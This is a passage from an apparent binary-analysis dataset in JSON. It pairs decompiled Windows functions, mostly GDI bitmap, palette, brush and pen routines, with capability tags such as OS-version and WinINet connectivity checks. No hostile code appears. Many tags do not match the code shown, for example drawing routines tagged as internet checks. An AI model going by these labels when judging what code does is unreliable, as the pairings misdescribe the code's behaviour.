        "decompiled_code": "\nvoid __fastcall fcn.00420034(uint param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 == NULL) {\n        return;\n    }\n    uStack28 = 0x420059;\n    fcn.0041ff38();\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    param_2[1] = param_2[1] + -1;\n    if (param_2[1] == 0) {\n        puVar1 = *(in_EAX + 4);\n        if (*(in_EAX + 4) == param_2) {\n            *(in_EAX + 4) = *param_2;\n        }\n        else {\n            do {\n                puVar2 = puVar1;\n                puVar1 = *puVar2;\n            } while (puVar1 != param_2);\n            *puVar2 = *param_2;\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x4200c3;\n    uStack32 = 0x4200bb;\n    fcn.0041ff44();\n    return;\n}\n",
        "token_count": 326
    },
    "004201f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004201f0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x420202;\n    fcn.0041ff38();\n    uStack28 = 0x420250;\n    iVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    for (puVar2 = *(in_EAX + 4); puVar2 != NULL; puVar2 = *puVar2) {\n        iStack32 = puVar2[2];\n        if ((iStack32 != 0) && (puVar2[5] < 0)) {\n            sub.gdi32.dll_DeleteObject();\n            puVar2[2] = 0;\n            iVar1 = iStack32;\n        }\n        iStack32 = iVar1;\n        iVar1 = iStack32;\n    }\n    *in_FS_OFFSET = iVar1;\n    puStack24 = 0x420257;\n    uStack28 = 0x42024f;\n    iStack32 = iVar1;\n    fcn.0041ff44();\n    return;\n}\n",
        "token_count": 302
    },
    "00420984": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420984(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iStack108;\n    int32_t iStack104;\n    char cStack100;\n    char cStack99;\n    char cStack98;\n    uchar uStack97;\n    uint8_t uStack93;\n    \n    piVar2 = 0x490b34;\n    piVar3 = param_2;\n    for (iVar1 = 0xc; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *piVar3 = *piVar2;\n        piVar2 = piVar2 + 1;\n        piVar3 = piVar3 + 1;\n    }\n    if (in_EAX != 0) {\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            param_2[1] = in_EAX;\n            if (699 < iStack104) {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 1;\n            }\n            if (cStack100 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 2;\n            }\n            if (cStack99 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 4;\n            }\n            if (cStack98 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 8;\n            }\n            *(param_2 + 0xe) = uStack97;\n            fcn.004039c0();\n            fcn.004035c4();\n            if ((uStack93 & 0xf) == 1) {\n                *(param_2 + 3) = 2;\n            }\n            else if ((uStack93 & 0xf) == 2) {\n                *(param_2 + 3) = 1;\n            }\n            else {\n                *(param_2 + 3) = 0;\n            }\n            *param_2 = in_EAX;\n            param_2[2] = iStack108;\n        }\n    }\n    return;\n}\n",
        "token_count": 530
    },
    "0042121c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0042121c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack28 = 0x42123b;\n        fcn.0041ff38();\n        uStack32 = 0x4212a2;\n        iStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        if (*(var_4h + 8) == 0) {\n            var_14h = *(*(var_4h + 0x1c) * 2 + 0x490da8);\n            var_10h = *(var_4h + 0x18);\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.0042074c();\n            puStack40 = &fcn.0042121c::var_14h;\n            uVar1 = sub.gdi32.dll_CreatePenIndirect();\n            *(var_4h + 8) = uVar1;\n        }\n        *in_FS_OFFSET = puStack40;\n        uStack32 = 0x4212a9;\n        iStack36 = 0x4212a1;\n        uVar1 = fcn.0041ff44();\n        return uVar1;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 402
    },
    "004214d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004214d4(void)\n\n{\n    fcn.0042143c();\n    fcn.00421458();\n    return;\n}\n",
        "token_count": 33
    },
    "00421508": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00421508(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack24 = 0x42152b;\n        fcn.0041ff38();\n        uStack28 = 0x4215d6;\n        puStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        if (*(var_4h + 8) == 0) {\n            if (*(var_4h + 0x18) == NULL) {\n                var_8h = 0;\n                uVar1 = *(var_4h + 0x1c);\n                if (uVar1 == 0) {\n                    var_10h = 0;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else if (uVar1 == 1) {\n                    var_10h = 1;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else {\n                    var_10h = 2;\n                    var_8h = (uVar1 & 0x7f) - 2;\n                    puStack24 = &stack0xfffffffc;\n                }\n            }\n            else {\n                var_10h = 3;\n                puStack24 = &stack0xfffffffc;\n                (**(**(var_4h + 0x18) + 0x70))();\n                var_8h = (**(**(var_4h + 0x18) + 0x68))();\n            }\n            var_ch = fcn.0042074c();\n            puStack32 = &fcn.00421508::var_10h;\n            uVar2 = sub.gdi32.dll_CreateBrushIndirect();\n            *(var_4h + 8) = uVar2;\n        }\n        *in_FS_OFFSET = puStack32;\n        puStack24 = 0x4215dd;\n        uStack28 = 0x4215d5;\n        uVar2 = fcn.0041ff44();\n        return uVar2;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 557
    },
    "004215f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004215f0(void)\n\n{\n    fcn.0042143c();\n    fcn.00421458();\n    return;\n}\n",
        "token_count": 33
    },
    "00421afc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.00421afc(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_1h;\n    \n    uStack16 = 0x496384;\n    puStack20 = 0x421b0d;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack24 = 0x421b48;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x50) == 0) {\n        puStack20 = &fcn.00421afc::var_1h + 1;\n        fcn.00421928();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x421b4f;\n    uStack24 = 0x496384;\n    uStack28 = 0x421b47;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 248
    },
    "00421d68": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421d68(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    param_2 = ~*(in_EAX + 2) & param_2;\n    if (*0x421ddc != param_2) {\n        if ((param_2 & 1) != 0) {\n            (**(*in_EAX + 0x14))();\n            if (in_EAX[1] == 0) {\n                fcn.0040c668();\n                fcn.004047cc();\n            }\n        }\n        if ((param_2 & 2) != 0) {\n            fcn.00421e08();\n        }\n        if ((param_2 & 4) != 0) {\n            fcn.00421e34();\n        }\n        if ((param_2 & 8) != 0) {\n            fcn.00421e64();\n        }\n        *(in_EAX + 2) = param_2 | *(in_EAX + 2);\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "004220a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004220a0(char param_1, uint *param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff44;\n    int32_t iStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint *puStack92;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint lpvObject;\n    uint var_30h;\n    uint var_2ch;\n    uint hdcDest;\n    int32_t var_18h;\n    int32_t hdc;\n    int32_t var_10h;\n    uint nWidth;\n    uint nHeight;\n    uint hgdiobj;\n    \n    nWidth = *param_2;\n    nHeight = param_2[1];\n    uStack72 = 0;\n    uStack76 = 0x4220bc;\n    hgdiobj = in_EAX;\n    var_18h = sub.gdi32.dll_CreateCompatibleDC();\n    uStack76 = 0;\n    puStack80 = 0x4220c6;\n    hdcDest = sub.gdi32.dll_CreateCompatibleDC();\n    uStack84 = 0x4221ee;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = &fcn.004220a0::lpvObject;\n    uStack96 = 0x18;\n    uStack100 = hgdiobj;\n    uStack104 = 0x4220e6;\n    puStack80 = &stack0xfffffffc;\n    sub.gdi32.dll_GetObjectA();\n    if (param_1 != '\\0') {\n        uStack104 = 0;\n        puStack108 = 0x1;\n        uStack112 = 1;\n        iStack116 = nHeight;\n        var_10h = sub.gdi32.dll_CreateBitmap(nWidth);\n        if (var_10h != 0) {\n            iVar1 = sub.gdi32.dll_SelectObject(var_18h, hgdiobj);\n            iVar2 = sub.gdi32.dll_SelectObject(hdcDest, var_10h);\n            sub.gdi32.dll_StretchBlt(hdcDest, 0, 0, nWidth, nHeight, var_18h, 0, 0, var_30h, var_2ch, 0xcc0020);\n            if (iVar1 != 0) {\n                in_stack_ffffff44 = var_18h;\n                sub.gdi32.dll_SelectObject(var_18h, iVar1);\n            }\n            if (iVar2 != 0) {\n                sub.gdi32.dll_SelectObject(hdcDest, iVar2);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffff44;\n        sub.gdi32.dll_DeleteDC(var_18h, 0x4221f5);\n        sub.gdi32.dll_DeleteDC(hdcDest);\n        return;\n    }\n    uStack104 = 0;\n    puStack108 = 0x422109;\n    hdc = sub.user32.dll_GetDC();\n    if (hdc == 0) {\n        puStack108 = 0x422117;\n        fcn.00421fe8();\n    }\n    uStack112 = 0x42215d;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    iVar1 = hdc;\n    puStack108 = &stack0xfffffffc;\n    var_10h = sub.gdi32.dll_CreateCompatibleBitmap(hdc, nWidth, nHeight);\n    if (var_10h == 0) {\n        fcn.00421fe8();\n    }\n    *in_FS_OFFSET = iVar1;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x422164);\n    return;\n}\n",
        "token_count": 879
    },
    "00422240": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00422240(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h, \n            uint hdc, int32_t arg_28h, int32_t arg_2ch)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    int32_t hpal;\n    uint var_20h;\n    uint crColor;\n    uint var_18h;\n    uint hgdiobj;\n    uint hdcDest;\n    uint nYOriginDest;\n    uint nXOriginDest;\n    \n    if (((**0x492cfc == 2) && (arg_18h == arg_2ch)) && (arg_14h == arg_28h)) {\n        uStack56 = 1;\n        puStack60 = 0x1;\n        uStack64 = hdc;\n        uStack68 = 0x422288;\n        sub.gdi32.dll_CreateCompatibleBitmap();\n        uStack68 = 0x42228d;\n        uStack68 = fcn.00422090();\n        iStack72 = arg_10h;\n        puStack76 = 0x42229d;\n        uVar1 = sub.gdi32.dll_SelectObject();\n        uStack80 = 0x422308;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        uVar5 = 0xccaa0029;\n        uVar2 = uVar1;\n        puStack76 = &stack0xfffffffc;\n        sub.gdi32.dll_MaskBlt();\n        *in_FS_OFFSET = in_EAX;\n        uVar2 = sub.gdi32.dll_SelectObject\n                          (arg_10h, uVar1, 0x4224bc, arg_2ch, arg_28h, hdc, arg_20h, arg_1ch, uVar2, arg_ch, arg_8h, \n                           uVar5);\n        sub.gdi32.dll_DeleteObject(uVar2);\n        return;\n    }\n    uStack56 = 0;\n    puStack60 = 0x42231b;\n    sub.gdi32.dll_CreateCompatibleDC();\n    puStack60 = 0x422320;\n    uVar2 = fcn.00422090();\n    uStack64 = 0x4224b5;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    iStack72 = arg_14h;\n    puStack76 = arg_18h;\n    uStack80 = hdc;\n    uStack84 = 0x42233c;\n    puStack60 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack84 = 0x422341;\n    uVar1 = fcn.00422090();\n    uStack84 = uVar1;\n    iVar3 = sub.gdi32.dll_SelectObject(uVar2);\n    iVar4 = sub.gdi32.dll_SelectPalette(hdc, *0x496350, 0);\n    sub.gdi32.dll_SelectPalette(hdc, iVar4, 0);\n    if (iVar4 == 0) {\n        hpal = sub.gdi32.dll_SelectPalette(uVar2, *0x496350, 0xffffffff);\n    }\n    else {\n        hpal = sub.gdi32.dll_SelectPalette(uVar2, iVar4, 0xffffffff);\n    }\n    sub.gdi32.dll_RealizePalette(uVar2);\n    sub.gdi32.dll_StretchBlt(uVar2, 0, 0, arg_18h, arg_14h, arg_10h, arg_ch, arg_8h, arg_18h, arg_14h, 0xcc0020);\n    sub.gdi32.dll_StretchBlt(uVar2, 0, 0, arg_18h, arg_14h, hdc, arg_20h, arg_1ch, arg_18h, arg_14h, 0x440328);\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    if (iVar3 != 0) {\n        sub.gdi32.dll_SelectObject(uVar2, iVar3);\n    }\n    sub.gdi32.dll_DeleteObject();\n    *in_FS_OFFSET = uVar1;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar2, hpal, 0, 0x4224bc);\n    }\n    sub.gdi32.dll_DeleteDC(uVar2);\n    return;\n}\n",
        "token_count": 1130
    },
    "00422584": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422584(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    param_2 = param_2 + -1;\n    if (-1 < param_2) {\n        if (**0x492c24 < 3) {\n            do {\n                uVar1 = *(in_EAX + param_2 * 4);\n                *(in_EAX + param_2 * 4) = uVar1 >> 0x10 & 0xff | CONCAT11(uVar1, uVar1 >> 8) << 8;\n                param_2 = param_2 + -1;\n            } while (-1 < param_2);\n        }\n        else {\n            do {\n                uVar1 = *(in_EAX + param_2 * 4);\n                *(in_EAX + param_2 * 4) = ((uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18) >> 8;\n                param_2 = param_2 + -1;\n            } while (-1 < param_2);\n        }\n    }\n    return;\n}\n",
        "token_count": 291
    },
    "004226f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004226f0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffb8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint hdc;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if (*0x496350 != 0) {\n        uStack20 = 0;\n        puStack24 = 0x42270d;\n        uVar1 = sub.user32.dll_GetDC();\n        uStack28 = 0x422776;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &fcn.004226f0::var_1h + 1;\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar1, 0x68);\n        if (0xf < iVar2) {\n            sub.gdi32.dll_GetPaletteEntries(*0x496350, 0, 8, in_EAX + 4);\n            in_stack_ffffffb8 = *0x496350;\n            sub.gdi32.dll_GetPaletteEntries(*0x496350, 8, 8, in_EAX + -0x1c + *(in_EAX + 2) * 4);\n            var_1h._0_1_ = 1;\n        }\n        *in_FS_OFFSET = in_stack_ffffffb8;\n        uVar1 = sub.user32.dll_ReleaseDC(0, uVar1, 0x42277d);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 415
    },
    "00422788": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00422788(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uStack1080;\n    uint32_t uStack1076;\n    uint uStack1072;\n    uint32_t uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uchar *puStack1056;\n    uint32_t uStack1052;\n    uint uStack1048;\n    uint uStack1044;\n    ushort uStack1040;\n    \n    uStack1040 = 0x300;\n    if (in_EAX == 0) {\n        uStack1044 = 0x4227eb;\n        fcn.00402ee0();\n    }\n    else {\n        uStack1044 = 0;\n        uStack1048 = 0x4227a6;\n        uVar3 = sub.gdi32.dll_CreateCompatibleDC();\n        puStack1056 = 0x4227af;\n        uStack1052 = uVar3;\n        uVar4 = sub.gdi32.dll_SelectObject();\n        puStack1056 = &stack0xfffffbe8;\n        uStack1060 = 0x100;\n        uStack1064 = 0;\n        uStack1072 = 0x4227c3;\n        uStack1068 = uVar3;\n        uVar2 = sub.gdi32.dll_GetDIBColorTable();\n        uStack1068 = uStack1068 & 0xffff | uVar2 << 0x10;\n        uStack1080 = 0x4227cf;\n        uStack1076 = uVar3;\n        uStack1072 = uVar4;\n        sub.gdi32.dll_SelectObject();\n        uStack1080 = uVar3;\n        sub.gdi32.dll_DeleteDC();\n    }\n    if (uStack1080._2_2_ != 0) {\n        if ((uStack1080._2_2_ != 0x10) || (cVar1 = fcn.004226f0(),  cVar1 == '\\0')) {\n            fcn.00422584();\n        }\n        uVar4 = sub.gdi32.dll_CreatePalette(&stack0xfffffbc8);\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 526
    },
    "0042282c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.0042282c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iStack44;\n    \n    if (((in_EAX != 0) && (iVar1 = sub.gdi32.dll_GetObjectA(),  iVar1 != 0)) && (in_EAX != 0)) {\n        sub.gdi32.dll_GetPaletteEntries();\n        fcn.00422584();\n        iStack44 = in_EAX;\n    }\n    return CONCAT44(iStack44, iStack44);\n}\n",
        "token_count": 119
    },
    "00422880": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422880(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    int32_t iStack76;\n    uint uStack68;\n    int32_t iStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint lpbInit;\n    uint hdc;\n    uint var_ch;\n    uint var_8h;\n    uint lpbmih;\n    \n    *(in_EAX + 8) = *(in_EAX + 8) >> 1;\n    uStack40 = 0x4228ae;\n    iVar1 = fcn.00422220();\n    *(in_EAX + 0x14) = iVar1 * *(in_EAX + 8);\n    uStack40 = 0x4228c6;\n    iVar1 = fcn.00422200();\n    uStack40 = 0;\n    puStack44 = 0x4228cf;\n    iStack76 = sub.user32.dll_GetDC();\n    if (iStack76 == 0) {\n        puStack44 = 0x4228dd;\n        fcn.00421f94();\n    }\n    uStack48 = 0x422a2d;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    iStack64 = in_EAX + 0x28 + iVar1 * 4;\n    uStack56 = 0;\n    uStack68 = 4;\n    puStack80 = 0x422917;\n    puStack44 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateDIBitmap();\n    puStack80 = 0x42291c;\n    uVar2 = fcn.00422090();\n    uStack84 = 0x422953;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = fcn.004220a0();\n    *in_EDX = uVar3;\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x42295a;\n    uStack88 = 0x422952;\n    uStack84 = uVar2;\n    sub.gdi32.dll_DeleteObject();\n    return;\n}\n",
        "token_count": 569
    },
    "00422adc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422adc(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar3;\n    int32_t iStack156;\n    uint uStack152;\n    uchar *puStack148;\n    uint uStack144;\n    int32_t iStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint hdc;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack132 = 0x422b02;\n    fcn.00402ccc();\n    uStack136 = 0x422dd5;\n    iStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    uStack144 = 0x422b21;\n    puStack132 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    if ((*arg_ch | arg_ch[1]) == 0) {\n        uStack144 = 0xb;\n        puStack148 = 0x422b2f;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        *arg_8h = uVar1;\n        puStack148 = 0xc;\n        uStack152 = 0x422b3b;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        arg_8h[1] = uVar1;\n    }\n    else {\n        *arg_8h = *arg_ch;\n        arg_8h[1] = arg_ch[1];\n    }\n    uStack144 = 0;\n    puStack148 = 0x422b57;\n    iVar2 = sub.user32.dll_GetDC();\n    if (iVar2 == 0) {\n        puStack148 = 0x422b65;\n        fcn.00421f94();\n    }\n    uStack152 = 0x422bc5;\n    iStack156 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff64;\n    puStack148 = &stack0xfffffffc;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xe);\n    iVar3 = iVar2;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xc);\n    *in_FS_OFFSET = iVar3;\n    sub.user32.dll_ReleaseDC(0, iVar2, 0x422bcc);\n    return;\n}\n",
        "token_count": 573
    },
    "00422e00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422e00(uint32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    uchar auStack96 [4];\n    int16_t iStack92;\n    int16_t iStack90;\n    uint32_t auStack84 [18];\n    \n    auStack84[3] = 0;\n    iVar1 = sub.gdi32.dll_GetObjectA();\n    if (iVar1 == 0) {\n        fcn.00421f70();\n    }\n    else if ((iVar1 < 0x40) || (auStack84[0] < 0x28)) {\n        fcn.00403720();\n        *param_2 = 0x28;\n        param_2[1] = 0x54;\n        param_2[2] = auStack96;\n    }\n    else {\n        puVar3 = auStack84;\n        puVar4 = param_2;\n        for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    if (param_1 == 2) {\n        *(param_2 + 0xe) = 1;\n    }\n    else if (param_1 - 3 < 0xe) {\n        *(param_2 + 0xe) = 4;\n        param_2[8] = param_1;\n    }\n    else if (param_1 - 0x11 < 0xf0) {\n        *(param_2 + 0xe) = 8;\n        param_2[8] = param_1;\n    }\n    else {\n        *(param_2 + 0xe) = iStack90 * iStack92;\n    }\n    *(param_2 + 3) = 1;\n    if (param_2[8] < param_2[9]) {\n        